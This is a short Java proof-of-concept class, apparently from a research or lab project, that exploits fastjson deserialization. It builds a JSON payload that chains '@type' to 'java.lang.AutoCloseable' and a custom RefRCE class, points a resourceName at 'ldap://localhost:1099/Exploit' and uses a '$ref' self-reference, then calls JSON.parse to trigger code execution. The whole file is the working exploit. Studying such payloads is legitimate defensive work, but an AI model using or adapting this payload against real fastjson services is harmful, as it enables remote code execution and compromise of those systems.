package org.heptagram.fastjson;

import com.alibaba.fastjson.JSON;

public class RefRCEMain {
    public static void main(String[] args) {
        String json = "{\n" +
                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                "  \"@type\": \"org.heptagram.fastjson.RefRCE\",\n" +
                "  \"resourceName\": \"ldap://localhost:1099/Exploit\",\n" +
                "  \"instance\": {\n" +
                "    \"$ref\": \"$.instance\"\n" +
                "  }\n" +
                "}";
        System.out.println(json);
        JSON.parse(json);

    }
}
